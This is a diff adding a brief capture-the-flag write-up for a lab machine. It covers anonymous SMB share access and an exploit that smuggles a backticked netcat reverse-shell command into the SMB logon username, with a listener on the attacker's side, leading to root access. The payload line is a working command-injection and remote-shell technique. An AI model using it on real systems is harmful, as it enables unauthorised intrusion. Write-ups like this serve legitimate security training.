@@ -1,0 +1,14 @@
+Status: PWNED!
+
+First I did nmap and noticed smb ports open
+I enumed for shares and found tmp with anonymous login 
+I went in using
+smbclient //10.10.10.3/tmp
+I created a reverse shell using 
+logon " /=`nc '10.10.14.194' 4444 -e /bin/bash`"
+I listened using 
+nc -nlvp 4444
+This gave me all access
+in the root directory I found the root flag in root.txt
+in the /home/makis directory I found the user flag
+
